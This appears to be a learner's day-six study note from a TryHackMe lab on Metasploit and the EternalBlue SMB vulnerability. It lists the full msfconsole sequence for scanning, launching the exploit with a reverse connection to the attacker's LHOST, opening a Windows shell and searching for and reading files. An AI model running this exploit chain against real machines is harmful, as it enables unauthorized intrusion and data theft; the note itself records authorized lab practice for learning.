# Day 6 — Metasploit + EternalBlue

## 📌 What I Learned
Metasploit is a penetration testing framework
used to find and exploit vulnerabilities.
EternalBlue is a vulnerability in Windows SMB
protocol — the same one WannaCry used in 2017.

---

## 🖥️ Commands Used

bash
msfconsole          # Open Metasploit
search eternalblue  # Find related modules
use 24              # Select scanner (not attack)
show options        # Check requirements
set RHOSTS 10.49.17.110   # Set target IP
run                 # Start scan

use 0               # Select actual exploit
set RHOSTS 10.49.17.110   # Set victim IP
set LHOST 10.49.145.6     # Set your IP
run                 # Launch attack

getuid              # Check permission level
shell               # Open Windows CMD
whoami              # Confirm identity
cd C:\              # Navigate to main drive
dir /s /b flag*.txt # Search entire computer
type filename.txt   # Show file content


---

## 🔑 Key Concepts

| Term | Meaning |
|------|---------|
| RHOST | Remote target IP address |
| LHOST | Your local IP (for reverse connection) |
| Scanner | Only checks — safe, finds weakness |
| Exploit | Actually attacks — uses weakness |
| SMB | Windows file sharing (port 445) |
| EternalBlue | Vulnerability WannaCry used in 2017 |

---

## 🔄 Attack Flow
Find Weakness → Exploit → Gain Access →

Check Permission → Control Machine →

Search Files → Read Data
---

## 💡 What Confused Me
Understanding why LHOST is needed.
After exploitation the victim machine needs
to know where to connect back.
LHOST = your IP = the destination
for that reverse connection.

---

## ⚠️ Important Note
This was practiced on TryHackMe lab only.
All practice is legal and authorized.
Never use these skills on unauthorized systems.
